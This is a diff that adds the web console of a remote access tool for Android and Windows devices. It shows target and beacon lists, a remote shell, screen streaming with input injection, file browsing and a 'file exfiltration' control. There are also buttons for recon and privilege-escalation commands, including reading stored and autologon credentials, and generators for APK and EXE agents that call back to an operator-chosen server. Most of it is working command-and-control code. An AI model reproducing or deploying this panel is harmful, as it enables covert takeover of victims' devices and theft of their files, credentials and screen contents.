+            <button class="fm-tbtn" onclick="fmRefresh()" title="Refresh">🔄</button>
+            <div class="fm-breadcrumb" id="fmBreadcrumb">
+              <span class="bc-seg current">/sdcard/</span>
+            </div>
+            <button class="fm-tbtn" id="viewToggle" onclick="toggleFmView()" title="Toggle view">☰</button>
+          </div>
+          <div class="fm-body" id="fmBody">
+            <div class="fm-empty"><div class="big">📂</div>Select a device to browse files</div>
+          </div>
+          <div class="fm-status" id="fmStatus">
+            <span id="fmPath">/sdcard/</span>
+            <span id="fmCount">—</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="tpage" id="page-screen">
+        <div class="screen-container">
+          <div class="screen-toolbar">
+            <button class="btn-screen" id="btnScreenshot" onclick="screenCapture()">📸 Capture</button>
+            <button class="btn-screen" id="btnStream" onclick="screenToggleStream()">▶ Stream</button>
+            <select id="screenQuality" class="inp" style="width:100px;flex:none;padding:5px 8px;font-size:10px;">
+              <option value="25">Low Q</option>
+              <option value="40" selected>Med Q</option>
+              <option value="60">High Q</option>
+              <option value="80">Best Q</option>
+            </select>
+            <span class="screen-status" id="screenStatus">Idle</span>
+          </div>
+          <div class="screen-view" id="screenView">
+            <div class="no-screen" id="screenPlaceholder">
+              <div class="big">🖥️</div>
+              Click <b>Capture</b> or <b>Stream</b> to view device screen<br>
+              <span style="font-size:10px;color:var(--text4)">Click to tap · Drag to swipe</span>
+            </div>
+            <img id="screenImg" style="display:none"
+                 onmousedown="screenMouseDown(event)"
+                 onmouseup="screenMouseUp(event)"
+                 onmousemove="screenMouseMove(event)">
+          </div>
+          <div class="screen-controls">
+            <button class="btn-ctrl" onclick="screenKey(4)" title="Back">◀</button>
+            <button class="btn-ctrl" onclick="screenKey(3)" title="Home">⚫</button>
+            <button class="btn-ctrl" onclick="screenKey(187)" title="Recent">◻</button>
+            <button class="btn-ctrl" onclick="screenKey(26)" title="Power">⏻</button>
+            <button class="btn-ctrl" onclick="screenKey(24)" title="Vol+">🔊</button>
+            <button class="btn-ctrl" onclick="screenKey(25)" title="Vol-">🔉</button>
+            <input class="text-input" id="screenTextInput" placeholder="Type text to send..."
+                   onkeydown="if(event.key==='Enter')screenSendText()">
+            <button class="btn-send-text" onclick="screenSendText()">SEND</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="tpage" id="page-terminal">
+        <div class="term-container">
+          <div class="term-toolbar">
+            <span class="term-title">Remote Shell — <span id="termTarget">no target</span></span>
+            <button class="term-clear-btn" onclick="termClear()">CLEAR</button>
+          </div>
+          <div class="term-output" id="termOutput">
+            <div class="term-welcome">Select a target device and type a command below.</div>
+          </div>
+          <div class="term-input-row">
+            <span class="term-prompt">$</span>
+            <input class="term-input" id="termInput" placeholder="Type command..." autocomplete="off" spellcheck="false"
+              onkeydown="if(event.key==='Enter')termExec()">
+            <button class="term-send-btn" onclick="termExec()">⏎</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="tpage" id="page-commands">
+        <div class="cmd-page">
+          <div class="cmd-group">
+            <div class="cmd-group-title">⚡ Data Collection</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" id="btn-collect_full" onclick="sendTask('collect_full')">
+                <span class="ci">📦</span>
+                <span class="ct">Full Dump<span class="cd">Device, battery, network, storage, apps</span></span>
+              </button>
+              <button class="cmd-btn" id="btn-collect_apps" onclick="sendTask('collect_apps')">
+                <span class="ci">📱</span>
+                <span class="ct">Installed Apps<span class="cd">List all applications</span></span>
+              </button>
+              <button class="cmd-btn" id="btn-collect_network" onclick="sendTask('collect_network')">
+                <span class="ci">🌐</span>
+                <span class="ct">Network Info<span class="cd">IPs, WiFi, connection type</span></span>
+              </button>
+            </div>
+            <div class="feedback" id="cmdFeedback"></div>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-title">🔍 Recon & Enumeration</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="quickCmd('ps -A | head -60')">
+                <span class="ci">⚙️</span>
+                <span class="ct">Running Processes<span class="cd">ps -A (top 60)</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('netstat -tunlp 2>/dev/null || ss -tunlp 2>/dev/null')">
+                <span class="ci">🌐</span>
+                <span class="ct">Listening Ports<span class="cd">netstat / ss fallback</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('getprop | grep -E &quot;model|brand|serial|version|sdk|wifi|dns|dhcp&quot; | head -30')">
+                <span class="ci">🏷️</span>
+                <span class="ct">System Properties<span class="cd">getprop (filtered)</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | head -40')">
+                <span class="ci">📡</span>
+                <span class="ct">Active Connections<span class="cd">/proc/net/tcp sockets</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('df -h')">
+                <span class="ci">💾</span>
+                <span class="ct">Disk Usage<span class="cd">df -h partitions</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('id && whoami && cat /proc/version')">
+                <span class="ci">🔑</span>
+                <span class="ct">Current User<span class="cd">id & whoami</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('uptime')">
+                <span class="ci">⏱️</span>
+                <span class="ct">Uptime<span class="cd">System uptime &amp; load</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('cat /proc/meminfo | head -20')">
+                <span class="ci">🧠</span>
+                <span class="ct">Memory Info<span class="cd">/proc/meminfo stats</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('pm list packages | head -20')">
+                <span class="ci">📦</span>
+                <span class="ct">Installed Packages<span class="cd">All packages (top 20)</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('env | head -30')">
+                <span class="ci">📄</span>
+                <span class="ct">Env Variables<span class="cd">Environment vars</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('mount | head -20')">
+                <span class="ci">📁</span>
+                <span class="ct">Mount Points<span class="cd">Mounted filesystems</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('dumpsys battery')">
+                <span class="ci">🔋</span>
+                <span class="ct">Battery Detail<span class="cd">dumpsys battery</span></span>
+              </button>
+            </div>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-title">🪟 Windows Recon</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="quickCmd('whoami /all')">
+                <span class="ci">🔑</span>
+                <span class="ct">Current User<span class="cd">whoami /all</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('systeminfo | findstr /B /C:&quot;OS&quot; /C:&quot;System&quot; /C:&quot;Total&quot; /C:&quot;Domain&quot; /C:&quot;Hotfix&quot;')">
+                <span class="ci">🏷️</span>
+                <span class="ct">System Info<span class="cd">OS, domain, hotfixes</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('ipconfig /all')">
+                <span class="ci">🌐</span>
+                <span class="ct">Network Config<span class="cd">ipconfig /all</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('tasklist /V | more')">
+                <span class="ci">⚙️</span>
+                <span class="ct">Running Processes<span class="cd">tasklist verbose</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('netstat -ano | findstr LISTEN')">
+                <span class="ci">📡</span>
+                <span class="ct">Listening Ports<span class="cd">netstat LISTEN</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('net user')">
+                <span class="ci">👥</span>
+                <span class="ct">Local Users<span class="cd">net user</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('net localgroup administrators')">
+                <span class="ci">👑</span>
+                <span class="ct">Local Admins<span class="cd">Administrators group</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('wmic qfe list brief')">
+                <span class="ci">🩹</span>
+                <span class="ct">Installed Patches<span class="cd">wmic qfe</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('set')">
+                <span class="ci">📄</span>
+                <span class="ct">Env Variables<span class="cd">Environment vars</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('wmic product get name,version 2>nul')">
+                <span class="ci">📦</span>
+                <span class="ct">Installed Software<span class="cd">wmic product list</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('schtasks /query /fo LIST /v | findstr /B /C:&quot;TaskName&quot; /C:&quot;Status&quot; /C:&quot;Next Run&quot;')">
+                <span class="ci">⏰</span>
+                <span class="ct">Scheduled Tasks<span class="cd">schtasks summary</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('wmic service where &quot;state=Running&quot; get name,displayname,pathname')">
+                <span class="ci">🔧</span>
+                <span class="ct">Running Services<span class="cd">Active services + paths</span></span>
+              </button>
+            </div>
+          </div>
+
+          <div class="cmd-group" style="border-color: rgba(239,68,68,0.3); background: rgba(239,68,68,0.03);">
+            <div class="cmd-group-title" style="color:#ef4444">🔓 Android Privilege Escalation</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="quickCmd('id && whoami')">
+                <span class="ci">👤</span>
+                <span class="ct">Current User<span class="cd">id + whoami</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('su -c id 2>&1 || echo NO_ROOT')">
+                <span class="ci">🔑</span>
+                <span class="ct">Test Root (su)<span class="cd">su -c id</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('getprop ro.debuggable && getprop ro.secure && getprop service.adb.root')">
+                <span class="ci">🐛</span>
+                <span class="ct">Debug Props<span class="cd">debuggable/secure/adb root</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('find /data/local/tmp -type f -perm -o+w 2>/dev/null; find /system -writable 2>/dev/null | head -20')">
+                <span class="ci">📝</span>
+                <span class="ct">Writable Files<span class="cd">World-writable in /data /system</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('find / -perm -4000 2>/dev/null | head -30')">
+                <span class="ci">⚡</span>
+                <span class="ct">SUID Binaries<span class="cd">find / -perm -4000</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('cat /proc/version && uname -a')">
+                <span class="ci">🐧</span>
+                <span class="ct">Kernel Version<span class="cd">Check for kernel exploits</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('mount | grep -E \"nosuid|noexec|rw\" && cat /proc/mounts | grep -v \"noexec\"')">
+                <span class="ci">💾</span>
+                <span class="ct">Mount Flags<span class="cd">RW/nosuid/noexec mounts</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('ls -la /data/local/tmp/ 2>/dev/null; ls -la /data/misc/ 2>/dev/null | head -20')">
+                <span class="ci">📂</span>
+                <span class="ct">Sensitive Dirs<span class="cd">/data/local/tmp, /data/misc</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('pm list packages -3 | head -30')">
+                <span class="ci">📱</span>
+                <span class="ct">3rd Party Apps<span class="cd">User-installed packages</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('cat /proc/net/tcp 2>/dev/null | awk \\'NR>1{print $2}\\' | while read x; do port=$((16#${x##*:})); ip=\"\"; hex=${x%%:*}; for i in 8 6 4 2; do ip=\"$ip.$((16#${hex:$((i-2)):2}))\"; done; echo \"${ip#.}:$port\"; done | sort -u')">
+                <span class="ci">🌐</span>
+                <span class="ct">Open Ports<span class="cd">Listening TCP ports</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('ls -la /system/xbin/ 2>/dev/null; which su busybox magisk 2>/dev/null')">
+                <span class="ci">🧰</span>
+                <span class="ct">Root Tools<span class="cd">su/busybox/magisk check</span></span>
+              </button>
+              <button class="cmd-btn" style="background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.3)" onclick="autoPrivesc()">
+                <span class="ci">🚀</span>
+                <span class="ct" style="color:#ef4444">AUTO SCAN<span class="cd">Run all privesc checks</span></span>
+              </button>
+            </div>
+          </div>
+
+          <div class="cmd-group" style="border-color: rgba(56,189,248,0.3); background: rgba(56,189,248,0.03);">
+            <div class="cmd-group-title" style="color:#38bdf8">🔓 Windows Privilege Escalation</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="quickCmd('whoami /priv')">
+                <span class="ci">👤</span>
+                <span class="ct">Token Privileges<span class="cd">whoami /priv</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('whoami /groups')">
+                <span class="ci">👥</span>
+                <span class="ct">Group Memberships<span class="cd">whoami /groups</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('net localgroup administrators')">
+                <span class="ci">🔑</span>
+                <span class="ct">Local Admins<span class="cd">net localgroup administrators</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\" | findstr /i \"Auto\"')">
+                <span class="ci">🛤️</span>
+                <span class="ct">Unquoted Paths<span class="cd">Non-system auto services</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')">
+                <span class="ci">📦</span>
+                <span class="ct">AlwaysInstallElevated<span class="cd">MSI privesc check</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('cmdkey /list')">
+                <span class="ci">🗝️</span>
+                <span class="ct">Stored Creds<span class="cd">cmdkey /list</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Hotfix(s)\"')">
+                <span class="ci">💻</span>
+                <span class="ct">Patch Level<span class="cd">OS version + hotfixes</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('icacls \"C:\\Program Files\\*\" 2>nul | findstr /i \"(F) (M) (W) Everyone Users Authenticated\"')">
+                <span class="ci">📝</span>
+                <span class="ct">Weak Folder ACLs<span class="cd">Writable Program Files</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword AutoAdminLogon\"')">
+                <span class="ci">🔐</span>
+                <span class="ct">Autologon Creds<span class="cd">Registry autologon</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('netsh advfirewall show allprofiles state')">
+                <span class="ci">🛡️</span>
+                <span class="ct">Firewall State<span class="cd">All profile states</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmd('powershell -c \"Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq \\\"Highest\\\"} | Select-Object TaskName,TaskPath | Format-Table -AutoSize\"')">
+                <span class="ci">⏰</span>
+                <span class="ct">Elevated Tasks<span class="cd">Scheduled tasks as SYSTEM</span></span>
+              </button>
+              <button class="cmd-btn" style="background:rgba(56,189,248,0.1);border-color:rgba(56,189,248,0.3)" onclick="autoPrivesc()">
+                <span class="ci">🚀</span>
+                <span class="ct" style="color:#38bdf8">AUTO SCAN<span class="cd">Run all privesc checks</span></span>
+              </button>
+            </div>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-title">🎯 Actions</div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" onclick="quickCmdPrompt('am start -a android.intent.action.VIEW -d ', 'Enter URL (e.g. https://example.com)')">
+                <span class="ci">🔗</span>
+                <span class="ct">Open URL<span class="cd">Launch URL in browser</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmdPrompt('am force-stop ', 'Package name (e.g. com.whatsapp)')">
+                <span class="ci">💀</span>
+                <span class="ct">Kill App<span class="cd">Force-stop a package</span></span>
+              </button>
+              <button class="cmd-btn" onclick="quickCmdPrompt('am start -n ', 'Component (e.g. com.android.settings/.Settings)')">
+                <span class="ci">🚀</span>
+                <span class="ct">Launch Activity<span class="cd">Start any app component</span></span>
+              </button>
+            </div>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-title">💬 Push Message</div>
+            <div class="input-row">
+              <input class="inp" id="msgInput" placeholder="Message to display on device...">
+              <button class="inp-btn" onclick="sendMessage()">→</button>
+            </div>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-title">📤 Exfiltrate File</div>
+            <div class="input-row">
+              <input class="inp" id="exfilPathInput" placeholder="/sdcard/DCIM/photo.jpg — remote path to grab">
+              <button class="inp-btn" onclick="exfilFile()" title="Grab">⬇</button>
+            </div>
+          </div>
+
+          <div class="cmd-group">
+            <div class="cmd-group-title">📥 Push File to Device</div>
+            <div class="push-area">
+              <input type="file" id="pushFileInput">
+              <input class="inp" id="pushDestInput" placeholder="/sdcard/Download/" value="/sdcard/Download/">
+              <button class="btn-primary" onclick="pushFile()" style="width:100%;margin-top:4px">PUSH FILE</button>
+              <div class="feedback" id="pushFeedback"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tpage" id="page-data">
+        <div id="dataViewer" class="dv">
+          <div class="empty-state"><div class="big">📊</div>Click a beacon or send a command to view data</div>
+        </div>
+      </div>
+
+      <div class="tpage" id="page-log">
+        <div class="log-page" id="beaconLog">
+          <div class="empty-state"><div class="big">📶</div>No beacons received yet</div>
+        </div>
+      </div>
+
+      <div class="tpage" id="page-tools">
+        <div class="tools-page">
+          <div class="tool-section">
+            <div class="tool-title">📋 Exfiltrated Files</div>
+            <div id="exfilFilesList" class="exfil-list"><span style="color:var(--text3);font-size:11px">No files yet</span></div>
+          </div>
+          <div class="tool-section">
+            <div class="tool-title">🔨 APK Generator</div>
+            <div class="apk-inputs">
+              <input type="text" class="inp" id="apkIp" placeholder="Server IP (e.g. 10.13.1.210)">
+              <input type="text" class="inp inp-port" id="apkPort" placeholder="9090" value="9090">
+            </div>
+            <button class="btn-build" id="buildBtn" onclick="generateApk()">BUILD APK</button>
+            <div id="buildStatus" class="build-info"></div>
+            <button class="btn-dl" id="downloadBtn" onclick="downloadApk()">⬇ DOWNLOAD APK</button>
+          </div>
+          <div class="tool-section">
+            <div class="tool-title">🪟 EXE Generator (Windows Agent)</div>
+            <div class="apk-inputs">
+              <input type="text" class="inp" id="exeIp" placeholder="Server IP (e.g. 10.13.1.210)">
+              <input type="text" class="inp inp-port" id="exePort" placeholder="9090" value="9090">
+            </div>
+            <button class="btn-build" id="exeBuildBtn" onclick="generateExe()">BUILD EXE</button>
+            <div id="exeBuildStatus" class="build-info"></div>
+            <button class="btn-dl" id="exeDownloadBtn" onclick="downloadExe()">⬇ DOWNLOAD EXE</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+let selectedTarget = '';
+let lastBeaconCount = 0;
+let waitingForTask = null;
+let currentDevices = [];
+let fmCurrentPath = '/sdcard/';
+let fmViewMode = 'grid';
+let fmFileData = null;
+let fmSelectedItem = null;
+let fmLoading = false;
+let autoSelected = false;
+
+function esc(s) { const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }
+function escAttr(s) { return s.replace(/'/g, "\\'").replace(/"/g, '&quot;'); }
+
+document.querySelectorAll('.mtab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.mtab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tpage').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    document.getElementById('page-' + tab.dataset.tab).classList.add('active');
+    if (tab.dataset.tab === 'data') document.getElementById('dataBadge').style.display = 'none';
+  });
+});
+
+function switchToTab(name) {
+  document.querySelectorAll('.mtab').forEach(t => {
+    t.classList.toggle('active', t.dataset.tab === name);
+  });
+  document.querySelectorAll('.tpage').forEach(t => t.classList.remove('active'));
+  document.getElementById('page-' + name).classList.add('active');
+  if (name === 'data') document.getElementById('dataBadge').style.display = 'none';
+}
+
+function startRefresh() {
+  setInterval(() => { fetchDevices(); fetchBeacons(); checkBuild(); checkExeBuild(); fetchExfilFiles(); }, 2000);
+  fetchDevices(); fetchBeacons(); fetchExfilFiles();
+}
+
+function getDefaultPath() {
+  const d = currentDevices.find(d => (d.id || d.ip) === selectedTarget);
+  return (d && d.os_type === 'windows') ? 'C:\\' : '/sdcard/';
+}
+
+function onTargetChange(ip) {
+  if (ip && ip !== selectedTarget) {
+    selectedTarget = ip;
+    fmCurrentPath = getDefaultPath();
+    fmBuildBreadcrumb(fmCurrentPath);
+    fmLoadDir(fmCurrentPath);
+    switchToTab('files');
+    fetchDevices();
+    termUpdateTarget();
+  }
+}
+
+async function fetchDevices() {
+  try {
+    const res = await fetch('/api/devices');
+    const devices = await res.json();
+    currentDevices = devices;
+    document.getElementById('deviceCount').textContent = devices.length;
+    document.getElementById('devBadge').textContent = devices.length;
+
+    const select = document.getElementById('targetSelect');
+    const prevVal = select.value;
+    select.innerHTML = '<option value="">— select device —</option>';
+    devices.forEach(d => {
+      const opt = document.createElement('option');
+      opt.value = d.id || d.ip;
+      opt.textContent = (d.os_type === 'windows' ? '[WIN] ' : '[AND] ') + d.device + ' (' + d.ip + ')';
+      select.appendChild(opt);
+    });
+    select.value = prevVal || '';
+
+    if (!autoSelected && !selectedTarget && devices.length > 0) {
+      autoSelected = true;
+      selectedTarget = devices[0].id || devices[0].ip;
+      select.value = selectedTarget;
+      fmCurrentPath = getDefaultPath();
+      fmBuildBreadcrumb(fmCurrentPath);
+      fmLoadDir(fmCurrentPath);
+      termUpdateTarget();
+    }
+
+    const list = document.getElementById('devicesList');
+    if (!devices.length) {
+      list.innerHTML = '<div class="empty-state"><div class="big">📡</div>Waiting for connections...</div>';
+      return;
+    }
+
+    list.innerHTML = '';
+    devices.forEach(d => {
+      const devId = d.id || d.ip;
+      const card = document.createElement('div');
+      card.className = 'dev-card' + (selectedTarget === devId ? ' active' : '');
+      card.onclick = () => {
+        const wasNew = selectedTarget !== devId;
+        selectedTarget = devId;
+        select.value = devId;
+        fetchDevices();
+        termUpdateTarget();
+        if (wasNew) {
+          fmCurrentPath = getDefaultPath();
+          fmBuildBreadcrumb(fmCurrentPath);
+          fmLoadDir(fmCurrentPath);
+          switchToTab('files');
+        }
+      };
+      card.innerHTML =
+        '<div class="dev-top">' +
+          '<span class="dev-dot ' + (d.tunnel ? 'on' : 'off') + '"></span>' +
+          '<span class="os-icon">' + (d.os_type === 'windows' ? '🪟' : '🤖') + '</span> ' +
+          esc(d.device) +
+          (d.tunnel ? '<span class="tn-badge">⚡ TUNNEL</span>' : '') +
+        '</div>' +
+        '<div class="dev-info">' +
+          '<span><span class="mi">🔋</span>' + esc(String(d.battery)) + (d.os_type === 'windows' ? '' : '%') + '</span>' +
+          '<span><span class="mi">📶</span>' + esc(String(d.network)) + '</span>' +
+          (d.os_type !== 'windows' ? '<span><span class="mi">📱</span>' + esc(String(d.apps_count)) + ' apps</span>' : '') +
+          '<span><span class="mi">' + (d.os_type === 'windows' ? '💻' : '🤖') + '</span>' + esc(String(d.os_type === 'windows' ? d.android : 'API ' + d.api)) + '</span>' +
+          '<span class="dev-ip">' + esc(d.ip) + '</span>' +
+        '</div>';
+      list.appendChild(card);
+    });
+  } catch(e) {}
+}
+
+async function fetchBeacons() {
+  try {
+    const res = await fetch('/api/beacons?limit=100');
+    const beacons = await res.json();
+    document.getElementById('beaconCount').textContent = beacons.length;
+
+    if (beacons.length > lastBeaconCount && lastBeaconCount >= 0) {
+      const newest = beacons[0];
+      const t = newest.data?.type || '';
+      const taskName = newest.data?.task || '';
+      if (lastBeaconCount > 0 || waitingForTask) {
+        if (t === 'task_response' || t === 'initial_full_dump' ||
+            (waitingForTask && (t === 'task_ack' || t === waitingForTask))) {
+          if (taskName === 'list_files' || taskName === 'shell_command' || taskName === 'screenshot') {
+            clearWaiting();
+          } else if (taskName === 'upload_file') {
+            fetchExfilFiles();
+            renderDataView(newest);
+            document.getElementById('dataBadge').style.display = 'block';
+            if (!document.querySelector('.mtab.active[data-tab="terminal"]') && !document.querySelector('.mtab.active[data-tab="screen"]'))
+              switchToTab('data');
+            clearWaiting();
+          } else {
+            renderDataView(newest);
+            document.getElementById('dataBadge').style.display = 'block';
+            if (!document.querySelector('.mtab.active[data-tab="terminal"]') && !document.querySelector('.mtab.active[data-tab="screen"]'))
+              switchToTab('data');
+            clearWaiting();
+          }
+        }
+        if (t === 'file_upload') fetchExfilFiles();
+      }
+    }
+    lastBeaconCount = beacons.length;
+
+    const log = document.getElementById('beaconLog');
+    if (!beacons.length) {
+      log.innerHTML = '<div class="empty-state"><div class="big">📶</div>No beacons received yet</div>';
+      return;
+    }
+
+    log.innerHTML = '';
+    beacons.forEach((b, i) => {
+      const row = document.createElement('div');
+      const t = (b.data?.type || b.type || 'heartbeat');
+      const isTask = t.includes('task') || t === 'initial_full_dump';
+      row.className = 'log-row' + (isTask && i === 0 ? ' flash' : '');
+      row.onclick = () => { renderDataView(b); switchToTab('data'); };
+      const timeShort = (b.time||'').split(' ').pop() || b.time;
+      row.innerHTML =
+        '<span class="log-time">' + esc(timeShort) + '</span>' +
+        '<span class="log-tag log-tag-' + t.replace(/[^a-z_]/g,'') + '">' + esc(t) + '</span>' +
+        '<span class="log-device">' + esc(b.device) + '</span>' +
+        '<span class="log-summary">' + summarize(b.data) + '</span>';
+      log.appendChild(row);
+    });
+  } catch(e) {}
+}
+
+function summarize(d) {
+  if (!d) return '';
+  const p = [];
+  if (d.installed_apps_count) p.push(d.installed_apps_count + ' apps');
+  if (d.battery_pct != null) p.push(d.battery_pct + '%');
+  if (d.network_type) p.push(d.network_type);
+  if (d.storage_free_gb) p.push(d.storage_free_gb + 'GB free');
+  if (d.task) p.push(d.task);
+  if (d.filename) p.push(d.filename);
+  if (d.file_count != null) p.push(d.file_count + ' items');
+  return esc(p.join(' · '));
+}
+
+function getFileIcon(name, isDir) {
+  if (isDir) return '📁';
+  const ext = name.split('.').pop().toLowerCase();
+  const map = {
+    jpg:'🖼️', jpeg:'🖼️', png:'🖼️', gif:'🖼️', webp:'🖼️', bmp:'🖼️', svg:'🖼️',
+    mp4:'🎬', mkv:'🎬', avi:'🎬', mov:'🎬', webm:'🎬', '3gp':'🎬',
+    mp3:'🎵', wav:'🎵', flac:'🎵', ogg:'🎵', aac:'🎵', m4a:'🎵',
+    pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', ppt:'📙', pptx:'📙',
+    txt:'📝', log:'📝', md:'📝', csv:'📝', json:'📝', xml:'📝',
+    zip:'📦', rar:'📦', '7z':'📦', tar:'📦', gz:'📦',
+    apk:'📲', jar:'📲', dex:'📲',
+    db:'🗄️', sqlite:'🗄️', sql:'🗄️',
+    sh:'⚙️', py:'⚙️', js:'⚙️', html:'⚙️', css:'⚙️', kt:'⚙️', java:'⚙️',
+    key:'🔑', pem:'🔑', cert:'🔑',
+  };
+  return map[ext] || '📄';
+}
+
+function formatFileSize(b) {
+  if (b == null || b === '') return '—';
+  if (b < 1024) return b + ' B';
+  if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
+  if (b < 1073741824) return (b/1048576).toFixed(1) + ' MB';
+  return (b/1073741824).toFixed(1) + ' GB';
+}
+
+function formatDate(ts) {
+  if (!ts) return '—';
+  const d = new Date(ts);
+  if (isNaN(d.getTime())) return '—';
+  return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
+}
+
+function fmBuildBreadcrumb(path) {
+  const bc = document.getElementById('fmBreadcrumb');
+  const parts = path.split('/').filter(Boolean);
+  let html = '<span class="bc-seg" onclick="fmNavigate(\'/\')">/ </span>';
+  let accum = '/';
+  parts.forEach((p, i) => {
+    accum += p + '/';
+    const isCurrent = i === parts.length - 1;
+    html += '<span class="bc-sep">›</span>';
+    html += '<span class="bc-seg' + (isCurrent ? ' current' : '') + '" onclick="fmNavigate(\'' + escAttr(accum) + '\')">' + esc(p) + '</span>';
+  });
+  bc.innerHTML = html;
+}
+
+function fmNavigate(path) {
+  fmCurrentPath = path;
+  fmBuildBreadcrumb(path);
+  document.getElementById('fmPath').textContent = path;
+  fmLoadDir(path);
+}
+
+function fmGoUp() {
+  const parent = fmCurrentPath.replace(/\/[^/]+\/?$/, '/') || '/';
+  fmNavigate(parent);
+}
+
+function fmRefresh() { fmLoadDir(fmCurrentPath); }
+
+async function fmLoadDir(path) {
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) {
+    document.getElementById('fmBody').innerHTML = '<div class="fm-empty"><div class="big">🎯</div>Select a target device first</div>';
+    return;
+  }
+  if (fmLoading) return;
+  fmLoading = true;
+  document.getElementById('fmBody').innerHTML = '<div class="fm-loading"><span class="spinner"></span> Loading...</div>';
+  document.getElementById('fmCount').textContent = 'loading...';
+
+  try {
+    const res = await fetch('/api/list_files', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({target, path})
+    });
+    const data = await res.json();
+    fmRenderResult(data);
+  } catch(e) {
+    document.getElementById('fmBody').innerHTML = '<div class="fm-empty"><div class="big">❌</div>Request failed</div>';
+    document.getElementById('fmCount').textContent = 'error';
+  }
+  fmLoading = false;
+}
+
+function fmRenderResult(data) {
+  fmFileData = data;
+  const body = document.getElementById('fmBody');
+  const cp = data.path || fmCurrentPath;
+  fmCurrentPath = cp;
+  fmBuildBreadcrumb(cp);
+  document.getElementById('fmPath').textContent = cp;
+
+  if (data.error) {
+    body.innerHTML = '<div class="fm-empty"><div class="big">❌</div>' + esc(data.error) + '</div>';
+    document.getElementById('fmCount').textContent = 'error';
+    return;
+  }
+
+  const files = data.files || [];
+  const dirs = files.filter(f => f.is_dir);
+  const regs = files.filter(f => !f.is_dir);
+  document.getElementById('fmCount').textContent = dirs.length + ' folders, ' + regs.length + ' files';
+
